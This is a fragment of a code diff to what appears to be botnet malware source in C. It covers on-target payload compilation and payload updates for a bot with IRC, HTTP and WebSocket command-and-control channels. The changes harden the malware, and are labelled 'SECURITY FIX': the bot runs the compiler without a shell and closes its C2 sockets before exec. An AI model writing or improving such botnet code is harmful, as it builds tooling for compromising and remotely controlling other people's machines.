@@ -133,7 +133,6 @@ int payload_update(notnet_bot_t *bot, const char *url, const char *dest) {
 
 /* ── On-Target Compilation ───────────────────────────────────── */
 int payload_compile(notnet_bot_t *bot, const char *source, const char *dest) {
-    (void)bot;
     log_info("Compiling payload: %s -> %s", source, dest);
 
     /* SECURITY FIX (#7): Replace system() with fork()+execvp() to avoid
@@ -163,6 +162,10 @@ int payload_compile(notnet_bot_t *bot, const char *source, const char *dest) {
         }
         if (pid == 0) {
             /* Child: exec compiler directly, no shell */
+            /* SECURITY FIX (#30): Close C2 sockets before exec */
+            if (bot->c2_irc.sock >= 0) close(bot->c2_irc.sock);
+            if (bot->c2_http.sock >= 0) close(bot->c2_http.sock);
+            if (bot->c2_ws.sock >= 0) close(bot->c2_ws.sock);
             char *argv[] = {
                 (char *)compilers[i],
                 "-static", "-Os", "-o", (char *)dest, (char *)source,
